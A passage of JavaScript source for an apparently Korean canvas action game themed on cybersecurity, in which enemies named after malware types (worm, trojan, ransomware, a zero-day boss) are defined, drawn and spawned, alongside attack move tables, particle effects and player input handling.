  worm: { name: '웜', hp: 40, r: 14, spd: 112, dmg: 7, color: '#FF9F1C', reach: 24, windup: 0.4, kbRes: 0.9, ai: 'melee', rotate: true, segs: 6 },
  virus: { name: '바이러스', hp: 32, r: 15, spd: 72, dmg: 7, color: '#FF3B6B', reach: 24, windup: 0.45, kbRes: 1, ai: 'melee', split: 0.4, spin: true },
  trojan: { name: '트로이목마', hp: 85, r: 19, spd: 56, dmg: 11, color: '#D9A93A', reach: 26, windup: 0.55, kbRes: 0.6, ai: 'melee', armor: 0.5 },
  botnet: { name: '봇넷 좀비', hp: 38, r: 15, spd: 62, dmg: 7, color: '#4DD0E1', reach: 0, ai: 'ranged', windup: 0.5, kbRes: 1 },
  rootkit: { name: '루트킷', hp: 50, r: 15, spd: 104, dmg: 9, color: '#9AA4B2', reach: 24, windup: 0.35, kbRes: 1, ai: 'melee', stealth: true },
  ransom: { name: '랜섬웨어', hp: 170, r: 25, spd: 46, dmg: 20, color: '#B388FF', reach: 30, windup: 0.7, kbRes: 0.4, ai: 'charger' },
  office: { name: '직장 스트레스', hp: 240, r: 22, spd: 74, dmg: 12, color: '#ffca28', reach: 30, windup: 0.6, kbRes: 0.55, ai: 'melee' },
  keeper: { name: '거점관리자', hp: 420, r: 28, spd: 78, dmg: 16, color: '#FF5252', reach: 36, windup: 0.55, kbRes: 0.25, ai: 'officer', big: true },
  officer: { name: '적장', hp: 1200, r: 34, spd: 88, dmg: 22, color: '#FF1744', reach: 42, windup: 0.5, kbRes: 0.15, ai: 'officer', big: true },
  boss: { name: '제로데이', hp: 9000, r: 62, spd: 84, dmg: 30, color: '#FF0040', reach: 64, windup: 0.6, kbRes: 0.04, ai: 'boss', big: true },
};

const LIGHT = [
  { kind: 'arc', dur: 0.24, a0: 0.05, a1: 0.13, cancel: 0.14, range: 104, arc: 150, dmg: 10, kb: 230, hs: 0.04, lunge: 170, shake: 2.5, dir: 1 },
  { kind: 'arc', dur: 0.24, a0: 0.05, a1: 0.13, cancel: 0.14, range: 104, arc: 150, dmg: 11, kb: 230, hs: 0.04, lunge: 170, shake: 2.5, dir: -1 },
  { kind: 'arc', dur: 0.27, a0: 0.06, a1: 0.15, cancel: 0.16, range: 114, arc: 185, dmg: 13, kb: 260, hs: 0.05, lunge: 190, shake: 3, dir: 1 },
  { kind: 'arc', dur: 0.28, a0: 0.06, a1: 0.16, cancel: 0.17, range: 120, arc: 210, dmg: 15, kb: 290, hs: 0.05, lunge: 190, shake: 3.5, dir: -1 },
  { kind: 'arc', dur: 0.42, a0: 0.08, a1: 0.25, cancel: 0.3, range: 145, arc: 360, dmg: 22, kb: 430, hs: 0.07, lunge: 120, shake: 6, dir: 1, heavyish: true },
];
const CHARGE = [
  { kind: 'radial', dur: 0.5, a0: 0.18, a1: 0.24, cancel: 0.42, range: 165, dmg: 26, kb: 140, launch: 760, hs: 0.08, shake: 9, label: 'sudo 권한 상승!' },
  { kind: 'dash', dur: 0.42, a0: 0.04, a1: 0.34, cancel: 0.38, range: 84, dmg: 15, kb: 520, tick: 0.06, hs: 0.025, shake: 4, speed: 950, label: 'DDoS 역돌진!' },
  { kind: 'wave', dur: 0.45, a0: 0.15, a1: 0.16, cancel: 0.36, dmg: 34, kb: 380, hs: 0.06, shake: 7, label: '패킷 필터 3연파!' },
  { kind: 'tornado', dur: 1.3, a0: 0.05, a1: 1.22, cancel: 1.25, range: 140, dmg: 9, kb: 280, tick: 0.08, hs: 0.012, shake: 2, label: '핫픽스 토네이도! (K 연타)' },
  { kind: 'pound', dur: 0.78, a0: 0.46, a1: 0.52, cancel: 0.7, range: 290, dmg: 72, kb: 720, launch: 950, hs: 0.15, shake: 20, label: 'ENTER 키 강타!!' },
];
const KEYCAPS = ['Ctrl', 'Alt', 'Del', 'Esc', 'F5', 'Enter', 'Tab', 'Shift', 'Fn', 'Ins', 'PgUp', 'Win'];

const game = {
  state: 'title', diff: DIFFS[1], menuIdx: 1, menuMode: 'main', codexIdx: 0,
  time: 0, ko: 0, combo: 0, comboT: 0, maxCombo: 0, comboPop: 0, stress: 0, stressDone: false,
  hitstop: 0, slowT: 0, shake: 0, sx: 0, sy: 0, zoom: 1, zoomPunch: 0, flash: 0, flashColor: '#fff', vignette: 0,
  enemies: [], newborn: [], bullets: [], waves: [], particles: [], texts: [], items: [], corpses: [], tele: [], bolts: [], cubes: [], obstacles: [],
  bossSpawnT: 0, winT: 0, gijoT: 0, gijoSpawnT: 0, drones: [],
  bases: [], boss: null, officerTimer: 45, officerIdx: 0, spawnT: 0, loop: 1, loopT: 0,
  banners: [], msgs: [], typing: null, overlay: null, cardToast: null,
  learned: [], quizRight: 0, quizTotal: 0, typePerfect: 0, result: null, nextKoMs: 100, titleT: 0, introT: 0,
  frameHits: 0, framePow: 0, frameHs: 0,
};
const cam = { x: HQ.x, y: HQ.y };
const player = {};

// ───────────────────────── 스프라이트 (절차 생성 후 캐시) ─────────────────────────
const SPR = {};
function makeSprite(r, fn) {
  const half = Math.ceil(r * 2.1 + 10);
  const c = document.createElement('canvas');
  c.width = c.height = half * 4;
  const g = c.getContext('2d');
  g.scale(2, 2); g.translate(half, half);
  fn(g);
  return c;
}
function whiteOf(src) {
  const c = document.createElement('canvas'); c.width = src.width; c.height = src.height;
  const g = c.getContext('2d'); g.drawImage(src, 0, 0);
  g.globalCompositeOperation = 'source-atop'; g.fillStyle = '#fff'; g.fillRect(0, 0, c.width, c.height);
  return c;
}
function rr(g, x, y, w, h, r) { g.beginPath(); g.roundRect ? g.roundRect(x, y, w, h, r) : g.rect(x, y, w, h); }
const DRAW = {
  bug(g, r, c) {
    g.strokeStyle = '#2f5a0e'; g.lineWidth = 2.2; g.lineCap = 'round';
    for (const s of [-1, 1]) for (let i = -1; i <= 1; i++) {
      g.beginPath(); g.moveTo(s * r * 0.4, i * r * 0.45); g.lineTo(s * r * 1.05, i * r * 0.45 - r * 0.2); g.lineTo(s * r * 1.3, i * r * 0.6 + r * 0.1); g.stroke();
    }
    g.beginPath(); g.moveTo(-3, -r); g.lineTo(-r * 0.6, -r * 1.55); g.moveTo(3, -r); g.lineTo(r * 0.6, -r * 1.55); g.stroke();
    const gr = g.createRadialGradient(-r * 0.3, -r * 0.3, 1, 0, 0, r * 1.1); gr.addColorStop(0, '#d4ff9a'); gr.addColorStop(1, c);
    g.fillStyle = gr; g.beginPath(); g.ellipse(0, r * 0.1, r * 0.78, r, 0, 0, TAU); g.fill();
    g.strokeStyle = '#2f5a0e'; g.lineWidth = 1.5; g.beginPath(); g.moveTo(0, -r * 0.6); g.lineTo(0, r * 1.05); g.stroke();
    g.fillStyle = '#1d3a07'; g.beginPath(); g.arc(0, -r * 0.85, r * 0.45, 0, TAU); g.fill();
    g.fillStyle = '#ff2d2d'; g.beginPath(); g.arc(-r * 0.2, -r * 0.95, 2.2, 0, TAU); g.arc(r * 0.2, -r * 0.95, 2.2, 0, TAU); g.fill();
  },
  wormHead(g, r, c) {
    const gr = g.createRadialGradient(-r * 0.3, -r * 0.3, 1, 0, 0, r * 1.1); gr.addColorStop(0, '#ffd39a'); gr.addColorStop(1, c);
    g.fillStyle = gr; g.beginPath(); g.arc(0, 0, r, 0, TAU); g.fill();
    g.fillStyle = '#3b1600'; g.beginPath(); g.ellipse(0, -r * 0.55, r * 0.55, r * 0.3, 0, 0, TAU); g.fill();
    g.fillStyle = '#fff'; for (let i = -2; i <= 2; i++) { g.beginPath(); g.moveTo(i * r * 0.2 - 2, -r * 0.4); g.lineTo(i * r * 0.2, -r * 0.65); g.lineTo(i * r * 0.2 + 2, -r * 0.4); g.fill(); }
    g.fillStyle = '#111'; g.beginPath(); g.arc(-r * 0.4, -r * 0.05, 2.4, 0, TAU); g.arc(r * 0.4, -r * 0.05, 2.4, 0, TAU); g.fill();
  },
  virus(g, r, c) {
    g.strokeStyle = c; g.lineWidth = 2.5; g.fillStyle = '#ff9db5';
    for (let i = 0; i < 10; i++) {
      const a = (i / 10) * TAU;
      g.beginPath(); g.moveTo(Math.cos(a) * r * 0.7, Math.sin(a) * r * 0.7); g.lineTo(Math.cos(a) * r * 1.2, Math.sin(a) * r * 1.2); g.stroke();
      g.beginPath(); g.arc(Math.cos(a) * r * 1.25, Math.sin(a) * r * 1.25, 3, 0, TAU); g.fill();
    }
    const gr = g.createRadialGradient(-r * 0.3, -r * 0.3, 1, 0, 0, r); gr.addColorStop(0, '#ffb3c6'); gr.addColorStop(1, c);
    g.fillStyle = gr; g.beginPath(); g.arc(0, 0, r * 0.82, 0, TAU); g.fill();
    g.fillStyle = '#fff'; g.beginPath(); g.ellipse(-r * 0.3, -r * 0.1, 3.4, 4.2, 0, 0, TAU); g.ellipse(r * 0.3, -r * 0.1, 3.4, 4.2, 0, 0, TAU); g.fill();
    g.fillStyle = '#300'; g.beginPath(); g.arc(-r * 0.28, -r * 0.02, 1.8, 0, TAU); g.arc(r * 0.32, -r * 0.02, 1.8, 0, TAU); g.fill();
    g.strokeStyle = '#300'; g.lineWidth = 2; g.beginPath(); g.moveTo(-r * 0.55, -r * 0.42); g.lineTo(-r * 0.1, -r * 0.25); g.moveTo(r * 0.55, -r * 0.42); g.lineTo(r * 0.1, -r * 0.25); g.stroke();
  },
  trojan(g, r, c) {
    const w = r * 1.55, h = r * 1.95;
    g.fillStyle = '#3a2a08'; rr(g, -w / 2 + 2, -h / 2 + 3, w, h, 4); g.fill();
    const gr = g.createLinearGradient(0, -h / 2, 0, h / 2); gr.addColorStop(0, '#ffe08a'); gr.addColorStop(1, c);
    g.fillStyle = gr; g.beginPath(); g.moveTo(-w / 2, -h / 2); g.lineTo(w / 2 - 8, -h / 2); g.lineTo(w / 2, -h / 2 + 8); g.lineTo(w / 2, h / 2); g.lineTo(-w / 2, h / 2); g.closePath(); g.fill();
    g.fillStyle = '#b8862a'; g.beginPath(); g.moveTo(w / 2 - 8, -h / 2); g.lineTo(w / 2 - 8, -h / 2 + 8); g.lineTo(w / 2, -h / 2 + 8); g.fill();
    g.fillStyle = '#5a3d00'; g.font = `bold ${Math.round(r * 0.55)}px ${FONT_MONO}`; g.textAlign = 'center'; g.textBaseline = 'middle'; g.fillText('.exe', 0, r * 0.45);
    g.fillStyle = '#c00'; g.beginPath(); g.arc(-r * 0.3, -r * 0.25, 2.6, 0, TAU); g.arc(r * 0.3, -r * 0.25, 2.6, 0, TAU); g.fill();
    g.strokeStyle = '#8a6a20'; g.lineWidth = 3; g.beginPath(); g.moveTo(-w / 2 - 4, -r * 0.2); g.lineTo(-w / 2 - 4, r * 0.6); g.stroke();
  },
  botnet(g, r, c) {
    g.strokeStyle = '#666'; g.lineWidth = 2; g.beginPath(); g.moveTo(0, -r * 0.75); g.lineTo(r * 0.35, -r * 1.35); g.stroke();
    g.fillStyle = '#ff3030'; g.beginPath(); g.arc(r * 0.35, -r * 1.4, 3, 0, TAU); g.fill();
    g.fillStyle = '#2c3440'; rr(g, -r, -r * 0.8, r * 2, r * 1.5, 4); g.fill();
    g.fillStyle = c; rr(g, -r * 0.82, -r * 0.62, r * 1.64, r * 1.12, 2); g.fill();
    g.strokeStyle = '#0b3940'; g.lineWidth = 2.2;
    for (const s of [-1, 1]) { const x = s * r * 0.38, y = -r * 0.15; g.beginPath(); g.moveTo(x - 4, y - 4); g.lineTo(x + 4, y + 4); g.moveTo(x + 4, y - 4); g.lineTo(x - 4, y + 4); g.stroke(); }
    g.beginPath(); g.moveTo(-r * 0.4, r * 0.28); g.lineTo(-r * 0.15, r * 0.18); g.lineTo(r * 0.1, r * 0.3); g.lineTo(r * 0.4, r * 0.18); g.stroke();
    g.fillStyle = '#2c3440'; g.fillRect(-r * 0.2, r * 0.7, r * 0.4, r * 0.35); g.fillRect(-r * 0.55, r * 1.0, r * 1.1, r * 0.18);
  },
  rootkit(g, r, c) {
    const gr = g.createLinearGradient(0, -r, 0, r); gr.addColorStop(0, '#c9d1dc'); gr.addColorStop(1, '#3d4450');
    g.fillStyle = gr; g.beginPath(); g.arc(0, -r * 0.1, r, Math.PI, 0);
    g.lineTo(r, r); for (let i = 0; i < 4; i++) { const x0 = r - (i + 0.5) * (r / 2); g.quadraticCurveTo(x0, r * 0.6, x0 - r / 4, r); }
    g.closePath(); g.fill();
    g.fillStyle = '#1a1d22'; g.beginPath(); g.ellipse(0, -r * 0.1, r * 0.7, r * 0.5, 0, 0, TAU); g.fill();
    g.fillStyle = '#39ff14'; g.shadowColor = '#39ff14'; g.shadowBlur = 8;
    g.beginPath(); g.ellipse(-r * 0.3, -r * 0.12, 3.2, 1.8, 0, 0, TAU); g.ellipse(r * 0.3, -r * 0.12, 3.2, 1.8, 0, 0, TAU); g.fill();
    g.shadowBlur = 0;
    g.fillStyle = '#39ff14'; g.font = `bold ${Math.round(r * 0.5)}px ${FONT_MONO}`; g.textAlign = 'center'; g.fillText('#', 0, r * 0.65);
  },
  ransom(g, r, c) {
    g.strokeStyle = '#d7c7ff'; g.lineWidth = r * 0.28; g.beginPath(); g.arc(0, -r * 0.35, r * 0.55, Math.PI, 0); g.stroke();
    const gr = g.createLinearGradient(0, -r * 0.4, 0, r); gr.addColorStop(0, '#d4bfff'); gr.addColorStop(1, '#6a3cc4');
    g.fillStyle = gr; rr(g, -r * 0.95, -r * 0.4, r * 1.9, r * 1.4, 6); g.fill();
    g.strokeStyle = '#3b1f78'; g.lineWidth = 2; rr(g, -r * 0.95, -r * 0.4, r * 1.9, r * 1.4, 6); g.stroke();
    g.fillStyle = '#ffd400'; g.font = `bold ${Math.round(r * 0.95)}px ${FONT}`; g.textAlign = 'center'; g.textBaseline = 'middle'; g.fillText('$', 0, r * 0.32);
    g.fillStyle = '#ff2050'; g.beginPath(); g.arc(-r * 0.5, -r * 0.05, 3, 0, TAU); g.arc(r * 0.5, -r * 0.05, 3, 0, TAU); g.fill();
  },
  keeper(g, r, c) {
    g.fillStyle = '#2a0508'; g.beginPath(); for (let i = 0; i < 6; i++) { const a = i / 6 * TAU - Math.PI / 2; g.lineTo(Math.cos(a) * r * 1.1, Math.sin(a) * r * 1.1); } g.closePath(); g.fill();
    g.strokeStyle = c; g.lineWidth = 3; g.stroke();
    const gr = g.createRadialGradient(0, -r * 0.2, 2, 0, 0, r); gr.addColorStop(0, '#ff9a9a'); gr.addColorStop(1, '#8a0010');
    g.fillStyle = gr; g.beginPath(); g.arc(0, 0, r * 0.75, 0, TAU); g.fill();
    g.fillStyle = '#fff200'; g.beginPath(); g.moveTo(-r * 0.5, -r * 0.2); g.lineTo(-r * 0.12, -r * 0.05); g.lineTo(-r * 0.45, r * 0.05); g.fill();
    g.beginPath(); g.moveTo(r * 0.5, -r * 0.2); g.lineTo(r * 0.12, -r * 0.05); g.lineTo(r * 0.45, r * 0.05); g.fill();
    g.fillStyle = '#300'; g.fillRect(-r * 0.35, r * 0.25, r * 0.7, r * 0.18);
  },
  office(g, r, c) { // 서류철 + 화난 얼굴 + 빨간 도장
    g.fillStyle = '#e0d6b8'; rr(g, -r * 0.9 + 3, -r * 1.05 + 3, r * 1.8, r * 2.1, 3); g.fill();
    g.fillStyle = '#fff8e1'; rr(g, -r * 0.9, -r * 1.05, r * 1.8, r * 2.1, 3); g.fill();
    g.fillStyle = c; g.fillRect(-r * 0.9, -r * 1.05, r * 1.8, r * 0.35);
    g.strokeStyle = '#bdbdbd'; g.lineWidth = 1.5; for (let i = 0; i < 3; i++) { g.beginPath(); g.moveTo(-r * 0.6, r * 0.35 + i * 6); g.lineTo(r * 0.6, r * 0.35 + i * 6); g.stroke(); }
    g.fillStyle = '#c62828'; g.beginPath(); g.moveTo(-r * 0.55, -r * 0.35); g.lineTo(-r * 0.15, -r * 0.2); g.lineTo(-r * 0.55, -r * 0.1); g.fill(); g.beginPath(); g.moveTo(r * 0.55, -r * 0.35); g.lineTo(r * 0.15, -r * 0.2); g.lineTo(r * 0.55, -r * 0.1); g.fill();
    g.strokeStyle = '#c62828'; g.lineWidth = 2.5; g.beginPath(); g.arc(r * 0.45, r * 0.6, r * 0.32, 0, TAU); g.stroke();
  },
  officer(g, r, c) {
    g.fillStyle = '#ffcc00';
    for (const s of [-1, 1]) { g.beginPath(); g.moveTo(s * r * 0.5, -r * 0.6); g.quadraticCurveTo(s * r * 1.3, -r * 1.0, s * r * 1.05, -r * 1.55); g.quadraticCurveTo(s * r * 0.9, -r * 0.9, s * r * 0.2, -r * 0.75); g.fill(); }
    const gr = g.createRadialGradient(-r * 0.2, -r * 0.3, 2, 0, 0, r * 1.1); gr.addColorStop(0, '#ff6b81'); gr.addColorStop(0.6, c); gr.addColorStop(1, '#4a0010');
    g.fillStyle = gr; g.beginPath(); g.arc(0, 0, r, 0, TAU); g.fill();
    g.strokeStyle = '#ffcc00'; g.lineWidth = 3; g.beginPath(); g.arc(0, 0, r, 0, TAU); g.stroke();
    g.fillStyle = '#000'; g.beginPath(); g.ellipse(0, -r * 0.05, r * 0.7, r * 0.32, 0, 0, TAU); g.fill();
    g.fillStyle = '#00f0ff'; g.shadowColor = '#00f0ff'; g.shadowBlur = 10;
    g.beginPath(); g.ellipse(-r * 0.3, -r * 0.05, r * 0.16, r * 0.1, 0, 0, TAU); g.ellipse(r * 0.3, -r * 0.05, r * 0.16, r * 0.1, 0, 0, TAU); g.fill();
    g.shadowBlur = 0;
    g.fillStyle = '#ffcc00'; g.font = `bold ${Math.round(r * 0.42)}px ${FONT_MONO}`; g.textAlign = 'center'; g.textBaseline = 'middle'; g.fillText('CVE', 0, r * 0.55);
  },
};
function buildSprites() {
  for (const k of ['bug', 'virus', 'trojan', 'botnet', 'rootkit', 'ransom', 'office', 'keeper', 'officer']) {
    const t = ETYPES[k];
    const s = makeSprite(t.r, (g) => DRAW[k](g, t.r, t.color));
    SPR[k] = { n: s, w: whiteOf(s) };
  }
  const wh = makeSprite(ETYPES.worm.r, (g) => DRAW.wormHead(g, ETYPES.worm.r, ETYPES.worm.color));
  SPR.worm = { n: wh, w: whiteOf(wh) };
}
buildSprites();

// 바닥 패턴 (네트워크 회로)
let floorPat = null;
const floorCanvas = document.createElement('canvas');
(function buildFloor() {
  const s = 256, c = floorCanvas; c.width = c.height = s;
  const g = c.getContext('2d');
  g.fillStyle = '#0a0f1c'; g.fillRect(0, 0, s, s);
  g.strokeStyle = '#111b31'; g.lineWidth = 1;
  for (let i = 0; i <= s; i += 64) { g.beginPath(); g.moveTo(i + 0.5, 0); g.lineTo(i + 0.5, s); g.moveTo(0, i + 0.5); g.lineTo(s, i + 0.5); g.stroke(); }
  g.strokeStyle = '#16264a'; g.lineWidth = 2;
  for (let i = 0; i < 9; i++) {
    let x = randi(0, 4) * 64, y = randi(0, 4) * 64;
    g.beginPath(); g.moveTo(x, y);
    for (let j = 0; j < 3; j++) { if (Math.random() < 0.5) x += randi(-1, 1) * 32; else y += randi(-1, 1) * 32; g.lineTo(x, y); }
    g.stroke();
    g.fillStyle = '#1f3a70'; g.fillRect(x - 3, y - 3, 6, 6);
  }
  floorPat = ctx.createPattern(c, 'repeat');
})();

// ───────────────────────── 게임 시작 / 초기화 ─────────────────────────
function newGame(diff) {
  game.diff = diff;
  Object.assign(game, {
    state: 'play', time: 0, ko: 0, combo: 0, comboT: 0, maxCombo: 0, comboPop: 0, stress: 0, stressDone: false,
    hitstop: 0, slowT: 0, shake: 0, zoom: 1, zoomPunch: 0, flash: 0, vignette: 0,
    enemies: [], newborn: [], bullets: [], waves: [], particles: [], texts: [], items: [], corpses: [], tele: [], bolts: [], cubes: [], obstacles: [],
    bossSpawnT: 0, winT: 0, gijoT: 0, gijoSpawnT: 100, drones: [], officeT: 45, inspectT: 90, lastQuizAt: -999, achT: 0, achToasts: [], achNew: [], wrongToday: [], askedIds: new Set(),
    logRight: 0, gijoUsed: false, dailyDone: false, stressBonus: 0, mission: null, missionMarker: null,
    bases: [], boss: null, officerTimer: 40, officerIdx: 0, spawnT: 0, loop: 1, loopT: 0,
    banners: [], msgs: [], typing: null, overlay: null, cardToast: null,
    learned: [], quizRight: 0, quizTotal: 0, typePerfect: 0, result: null, nextKoMs: 100, introT: 0, seenTypes: {},
  });
  Object.assign(player, {
    x: HQ.x, y: HQ.y + 120, r: 22, hp: diff.hp, maxhp: diff.hp, facing: -Math.PI / 2, state: 'idle', t: 0,
    atk: null, atkKind: null, step: 0, queued: null, hitSet: new Set(), tickT: 0, dashT: 0, dashCd: 0, dashDx: 0, dashDy: 0,
    inv: 0, musou: 0, term: 0, atkMul: 1, patchT: 0, quizBuffT: 0, walk: 0, flip: 1, level: 1, z: 0, hurtT: 0,
    musouT: 0, musouDur: 0, musouTick: 0, waveFired: false, pounded: false, swingAng: 0,
  });
  // 거점 6개 + HQ
  game.cveOrder = buildCveOrder();
  if (diff.mission) game.mission = { stage: 0, prog: 0 }; // 훈련 모드: 거점 없이 스테이지 진행
  const pos = [[600, 520], [1800, 360], [3000, 520], [3000, 2180], [1800, 2340], [600, 2180]];
  if (!diff.mission) CT.bases.forEach((b, i) => {
    if (i >= 6) return;
    game.bases.push({ x: pos[i][0], y: pos[i][1], r: 230, owner: 'enemy', info: b, keeper: null, pulse: Math.random() * 6 });
  });
  for (const b of game.bases) spawnKeeper(b);
  flushNewborn();
  // 서버랙 블록 기둥 (충돌 있음, 매 판 같은 배치)
  let seed = 20261124;
  const rnd = () => ((seed = (seed * 1664525 + 1013904223) >>> 0) / 4294967296);
  for (let tries = 0; game.obstacles.length < 28 && tries < 800; tries++) {
    const x = 160 + rnd() * (WORLD.w - 320), y = 160 + rnd() * (WORLD.h - 320);
    if (Math.hypot(x - HQ.x, y - HQ.y) < 330) continue;
    if (game.bases.some((b) => Math.hypot(x - b.x, y - b.y) < b.r + 110)) continue;
    if (game.obstacles.some((o) => Math.hypot(x - o.x, y - o.y) < 260)) continue;
    game.obstacles.push({ x: Math.round(x / 64) * 64 + 32, y: Math.round(y / 64) * 64 + 32, r: 40, h: 2 + Math.floor(rnd() * 3) });
  }
  cam.x = player.x; cam.y = player.y;
  audio.init(); audio.startBgm();
  const intro = CT.stageIntro.length ? CT.stageIntro : DEFAULT_CONTENT.stageIntro;
  banner('보안 관제 개시', pick(intro), '#00e5ff', 3.2);
  if (!diff.mission) msg('[관제] 거점 6곳이 취약점에 점령되었습니다. 거점관리자를 격파하세요!', '#ffd54f');
  msg('[TIP] J 연타 → K 로 강공격 변화 · SPACE 무쌍 · E 터미널 · 숫자키 무기 교체', '#80deea');
  if (diff.mission) { game.officeT = 9999; startStage(0); banner(MISSION.title, '침해사고 대응 6단계를 직접 수행합니다', '#80deea', 3.5, 54); }
}

function spawnKeeper(b) {
  const e = makeEnemy('keeper', b.x, b.y);
  e.base = b; e.name = b.info.keeper; e.title = b.info.base + ' 관리자';
  e.hp = e.maxhp = ETYPES.keeper.hp * game.diff.ehp * (1 + (game.loop - 1) * 0.35);
  b.keeper = e;
}

function makeEnemy(type, x, y) {
  const t = ETYPES[type];
  const mul = game.diff.ehp * (1 + countAlly() * 0.1) * (1 + (game.loop - 1) * 0.3) * (1 + game.time / 900);
  const e = {
    type, def: t, x: clamp(x, 40, WORLD.w - 40), y: clamp(y, 40, WORLD.h - 40), r: t.r, hp: t.hp * mul, maxhp: t.hp * mul,
    spd: t.spd * rand(0.9, 1.12), dmg: t.dmg, flash: 0, z: 0, vz: 0, kbx: 0, kby: 0, stun: 0, atkCd: rand(0.5, 1.5), windup: 0,
    heading: 0, trail: [], seed: Math.random() * 100, chargeT: 0, cdx: 0, cdy: 0, dead: false, hitOnce: false, pat: 0, patT: 2,
  };
  // 순회 중 배열 변경 방지: 대기열에 넣고 프레임 끝에 합류
  game.newborn.push(e);
  return e;
}
function flushNewborn() { if (game.newborn.length) { game.enemies.push(...game.newborn); game.newborn.length = 0; } }
const enemyCount = () => game.enemies.length + game.newborn.length;
const countAlly = () => game.bases.filter((b) => b.owner === 'ally').length;

// ───────────────────────── 메시지 / 배너 / 이펙트 ─────────────────────────
function banner(text, sub, color = '#fff', dur = 2.2, size = 64) {
  game.banners.push({ text, sub, color, t: 0, dur, size });
  if (game.banners.length > 3) game.banners.shift();
}
function msg(text, color = '#cfd8dc') {
  game.msgs.push({ text, color, t: 0 });
  if (game.msgs.length > 6) game.msgs.shift();
}
function floatText(x, y, txt, color, size = 18, opts = {}) {
  if (game.texts.length > (IS_MOBILE ? 80 : 160) && !opts.important) return;
  game.texts.push({ x, y, txt, color, size, life: opts.life || 0.8, max: opts.life || 0.8, vy: opts.vy ?? -70, vx: opts.vx || 0, pop: 1, bold: opts.bold });
}
function addShake(v) { game.shake = Math.min(28, Math.max(game.shake, v)); }
function addHitstop(v) { game.hitstop = Math.min(0.2, Math.max(game.hitstop, v)); }
function screenFlash(color, a) { game.flashColor = color; game.flash = Math.max(game.flash, a); }

function particle(p) { if (game.particles.length < (IS_MOBILE ? 700 : 1600)) game.particles.push(p); }
function sparks(x, y, n, color, spd = 420, ang = null, spread = TAU) {
  for (let i = 0; i < n; i++) {
    const a = ang === null ? Math.random() * TAU : ang + rand(-spread / 2, spread / 2);
    const s = rand(0.3, 1) * spd;
    particle({ type: 'spark', x, y, vx: Math.cos(a) * s, vy: Math.sin(a) * s, life: rand(0.15, 0.35), max: 0.35, color, size: rand(1.5, 3.2), drag: 6 });
  }
}
function binaryBurst(x, y, n, color) {
  for (let i = 0; i < n; i++) {
    const a = Math.random() * TAU, s = rand(80, 320);
    particle({ type: 'bin', x, y, vx: Math.cos(a) * s, vy: Math.sin(a) * s - 80, life: rand(0.4, 0.8), max: 0.8, color, size: randi(10, 16), txt: Math.random() < 0.5 ? '0' : '1', drag: 3, g: 300 });
  }
}
function keycapBurst(x, y, n) {
  for (let i = 0; i < n; i++) {
    const a = Math.random() * TAU, s = rand(200, 520);
    particle({ type: 'key', x, y, vx: Math.cos(a) * s, vy: Math.sin(a) * s - 200, life: rand(0.6, 1.0), max: 1, color: '#e0e6f0', size: 1, txt: pick(KEYCAPS), rot: rand(-1, 1), vr: rand(-12, 12), drag: 2, g: 900 });
  }
}
// 복셀 파편: 적이 큐브 조각으로 부서져 튀고 구르는 타격감의 핵심 (x,y 평면 + 높이 h)
const CUBE_PAL = {
  bug: ['#8BEA3B', '#5fb320', '#24470a', '#c6ff8a'], worm: ['#FF9F1C', '#e07b00', '#ffd39a'], virus: ['#FF3B6B', '#c2185b', '#ffb3c6'],
  trojan: ['#a0682a', '#7a4a1a', '#d9a93a'], botnet: ['#2c3440', '#4DD0E1', '#546e7a'], rootkit: ['#3d4450', '#6f7885', '#39ff14'],
  ransom: ['#7c4dff', '#b388ff', '#cfd8dc', '#ffd400'], keeper: ['#8a0010', '#5a0a12', '#ff5252', '#fff200'], officer: ['#c4001d', '#1a0006', '#ffcc00', '#00f0ff'],
  boss: ['#d0003a', '#3a0010', '#ffffff', '#ff6d00'], office: ['#fff8e1', '#ffca28', '#c62828', '#e0d6b8'],
};
function cubeBurst(x, y, h, n, type, power = 1, dirx = 0, diry = 0, sizeMul = 1) {
  const pal = CUBE_PAL[type] || ['#ffffff'];
  for (let i = 0; i < n; i++) {
    const a = Math.random() * TAU, s = rand(60, 260) * power;
    game.cubes.push({ x: x + rand(-8, 8), y: y + rand(-8, 8), h: h + rand(4, 30), vx: Math.cos(a) * s + dirx * 0.35, vy: Math.sin(a) * s + diry * 0.35, vh: rand(220, 560) * Math.min(1.6, power),
      size: rand(4, 9) * sizeMul, color: pick(pal), rot: Math.random() * TAU, vr: rand(-14, 14), life: rand(1.4, 2.4), max: 2.4 });
  }
  const cap = IS_MOBILE ? 400 : 900;
  if (game.cubes.length > cap) game.cubes.splice(0, game.cubes.length - cap);
}
function updateCubes(dt) {
  for (const c of game.cubes) {
    c.life -= dt; c.vh -= 1500 * dt; c.h += c.vh * dt;
    c.x += c.vx * dt; c.y += c.vy * dt; c.rot += c.vr * dt;
    if (c.h < c.size / 2) { c.h = c.size / 2; if (c.vh < -60) { c.vh = -c.vh * 0.38; c.vx *= 0.6; c.vy *= 0.6; c.vr *= 0.6; } else { c.vh = 0; c.vx *= 0.9; c.vy *= 0.9; c.vr *= 0.8; } }
  }
  game.cubes = game.cubes.filter((c) => c.life > 0);
}
function ring(x, y, r0, r1, color, life = 0.35, width = 6) { particle({ type: 'ring', x, y, r0, r1, life, max: life, color, width }); }
function dust(x, y, n = 6) {
  for (let i = 0; i < n; i++) { const a = Math.random() * TAU; particle({ type: 'dust', x, y, vx: Math.cos(a) * rand(40, 140), vy: Math.sin(a) * rand(20, 70), life: rand(0.3, 0.6), max: 0.6, color: '#5a6b8c', size: rand(4, 9), drag: 4 }); }
}

// ───────────────────────── 플레이어 ─────────────────────────
// 시선 기준 조작(1인칭·등뒤 3인칭 공통). 조준점은 1인칭에서만
const isFPS = () => use3D() && (window.R3D.mode === 'fps' || window.R3D.mode === 'chase');
const isFirstPerson = () => use3D() && window.R3D.mode === 'fps';
function inputDir() {
  if (isFPS()) {
    // 1인칭: W/S(↑↓) 전후, A/D 좌우 이동 — 시선 기준
    let f = 0, s = 0;
    if (isDown('KeyW', 'ArrowUp')) f += 1;
    if (isDown('KeyS', 'ArrowDown')) f -= 1;
    if (isDown('KeyD')) s += 1;
    if (isDown('KeyA')) s -= 1;
    if (touch.joy) f -= touch.jy;
    const a = player.facing, fx = Math.cos(a), fy = Math.sin(a), rx = -fy, ry = fx;
    const dx = fx * f + rx * s, dy = fy * f + ry * s, l = Math.hypot(dx, dy);
    return l ? { x: dx / l, y: dy / l, on: true } : { x: 0, y: 0, on: false };
  }
  if (touch.joy) { const m = Math.hypot(touch.jx, touch.jy); if (m > 0.18) return { x: touch.jx / m, y: touch.jy / m, on: true }; }
  let dx = 0, dy = 0;
  if (isDown('KeyA', 'ArrowLeft')) dx -= 1;
